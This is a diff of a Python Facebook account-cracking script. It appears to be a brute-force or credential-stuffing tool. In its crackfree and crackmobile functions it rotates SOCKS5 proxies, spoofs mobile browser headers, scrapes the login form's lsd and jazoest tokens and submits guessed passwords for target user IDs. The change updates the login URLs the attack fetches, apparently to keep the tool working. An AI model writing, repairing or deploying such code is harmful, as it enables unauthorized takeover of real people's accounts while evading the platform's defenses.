@@ -555,7 +555,7 @@ def crackfree(idf,pwv):
 			nip=random.choice(prox)
 			proxs= {'http': 'socks5://'+nip}
 			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-			p = ses.get("https://m.facebook.com/?stype=lo&jlou=AfcuaXHCk9ZpFg-CbjxNg___k-GkovG8T0skbfYUYIb_oZfd_qOp8tP0ESVYZ_uldXCcfDqNGezFc1I3JP-HwQrmZ3dG0JTmQ2onZf8k57wO2Q&smuh=38850&lh=Ac_8RsKhgOp56_-szSc&_rdr")
+			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=1013557125334052&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.4%2Fdialog%2Foauth%3Fclient_id%3D1013557125334052%26scope%3Dpublic_profile%252Cemail%26state%3D505879130cdf4eb692edb1fada6f60bf%26redirect_uri%3Dhttps%253A%252F%252Fforum.idws.id%252Fregister%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6f4f0eba-2099-4a83-983f-69e987f8f25f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fforum.idws.id%2Fregister%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D505879130cdf4eb692edb1fada6f60bf%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr#_=_")
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
@@ -663,7 +663,7 @@ def crackmobile(idf,pwv):
 			nip=random.choice(prox)
 			proxs= {'http': 'socks5://'+nip}
 			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-			p = ses.get("https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Fhome.php%3Fzero_e%3D3%26zero_et%3D1666153724%26refsrc%3Ddeprecated&refsrc=deprecated&_rdr")
+			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F07%252Fnew-ways-to-create-instagram-reels-remix%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=id_ID&_rdc=1&_rdr#_=_")
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
